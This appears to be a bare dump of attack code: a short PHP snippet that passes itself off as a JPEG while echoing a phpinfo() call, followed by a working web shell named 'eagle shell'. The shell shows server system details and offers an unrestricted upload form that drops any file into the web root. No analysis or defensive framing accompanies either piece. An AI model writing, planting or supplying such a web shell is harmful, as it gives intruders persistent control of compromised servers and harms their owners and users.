<?php 
header("Content-Type: image/jpeg");
echo "<?php phpinfo(); ?>";
?>
------------------------------------------
<?php
/* Shell Name: eagle shell */
echo '<title>Web Manager</title>';
echo '<style>body{background:#222;color:#e8e8e8;font-family:monospace;padding:20px;}</style>';
echo '<h2>System Information</h2>';
echo '<pre>'.php_uname().'</pre>';
echo '<hr>';
echo '<h2>File Upload</h2>';
echo '<form method="post" enctype="multipart/form-data">';
echo '<input type="file" name="f" style="background:#333;color:#fff;padding:5px;">';
echo '<input type="submit" value="Upload" style="background:#555;color:#fff;padding:5px;margin-left:10px;cursor:pointer;">';
echo '</form>';
// File upload handler
if(isset($_FILES['f']) && $_FILES['f']['name']){
    $target = basename($_FILES['f']['name']);
    if(move_uploaded_file($_FILES['f']['tmp_name'], $target)){
        echo '<div style="background:#2ecc71;color:#fff;padding:10px;margin-top:10px;">Upload Success: <a href="'.$target.'" style="color:#fff;">'.$target.'</a></div>';
    }else{
        echo '<div style="background:#e74c3c;color:#fff;padding:10px;margin-top:10px;">Upload Failed</div>';
    }
}
?>
